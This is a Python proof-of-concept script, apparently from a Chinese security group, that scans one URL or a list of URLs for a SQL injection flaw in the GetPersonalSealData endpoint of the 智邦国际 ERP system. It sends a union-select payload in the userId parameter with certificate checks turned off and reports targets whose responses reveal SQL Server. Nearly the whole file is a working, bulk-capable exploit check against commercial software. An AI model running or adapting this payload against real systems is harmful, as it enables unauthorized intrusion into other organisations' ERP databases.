#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : 浅梦安全
import requests
import argparse
import time
from requests.exceptions import RequestException
from urllib3.exceptions import InsecureRequestWarning

RED = '\033[91m'
RESET = '\033[0m'
# 忽略不安全请求的警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def check_vulnerability(url):
    try:
        # 构造完整的攻击URL
        attack_url = url.rstrip('/') + "/SYSN/json/pcclient/GetPersonalSealData.ashx?imageDate=1&userId=-1%20union%20select%20@@version--"
  
        response = requests.get(attack_url, verify=False, timeout=10)
  
        # 检查响应状态码和响应体中的关键字
        if response.status_code == 200 and 'SQL Server' in response.text:
            print(f"{RED}URL [{url}] 存在智邦国际ERP系统（生产版）GetPersonalSealData SQL注入漏洞。{RESET}")
        else:
            print(f"URL [{url}] 未发现漏洞。")
    except RequestException as e:
        print(f"URL [{url}] 请求失败: {e}")

def main():
    parser = argparse.ArgumentParser(description='检测目标地址是否存在智邦国际ERP系统（生产版）GetPersonalSealData SQL注入漏洞')
    parser.add_argument('-u', '--url', help='指定目标地址')
    parser.add_argument('-f', '--file', help='指定包含目标地址的文本文件')

    args = parser.parse_args()

    if args.url:
        if not args.url.startswith("http://") and not args.url.startswith("https://"):
            args.url = "http://" + args.url
        check_vulnerability(args.url)
    elif args.file:
        with open(args.file, 'r') as file:
            urls = file.read().splitlines()
            for url in urls:
                if not url.startswith("http://") and not url.startswith("https://"):
                    url = "http://" + url
                check_vulnerability(url)

if __name__ == '__main__':
    main()
